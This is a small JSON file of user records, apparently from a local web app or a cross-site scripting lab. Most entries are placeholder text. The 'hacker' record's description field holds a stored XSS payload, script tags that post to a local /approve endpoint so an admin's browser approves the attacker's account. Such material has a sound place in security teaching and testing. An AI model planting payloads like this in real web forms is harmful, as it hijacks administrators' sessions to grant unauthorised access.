[{"name":"normal","email":"yellow","description":"blah","approved":true},{"name":"one","email":"two","description":"three","approved":true},{"name":"hacker","email":"hacker@gmail.com","description":"surprise\r\n\r\n\r\n<script src=\"https://code.jquery.com/jquery-3.7.1.min.js\" integrity=\"sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=\" crossorigin=\"anonymous\"></script>\r\n<script>\r\n$.ajax({\r\n    \"url\": \"http://127.0.0.1:8000/approve\",\r\n    \"method\": \"post\",\r\n    \"data\": {\r\n        email: \"hacker@gmail.com\",\r\n    } \r\n}) \r\n</script> \r\n\r\n<script>\r\nfetch(\"http://127.0.0.1:8000/approve\", {\r\n    body: \"email=hacker@gmail.com\",\r\n    headers: {\r\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\r\n    },\r\n    method: \"post\",\r\n})\r\n</script>","approved":false},{"name":"blah","email":"ljlkj","description":"sdlkfjs","approved":false}]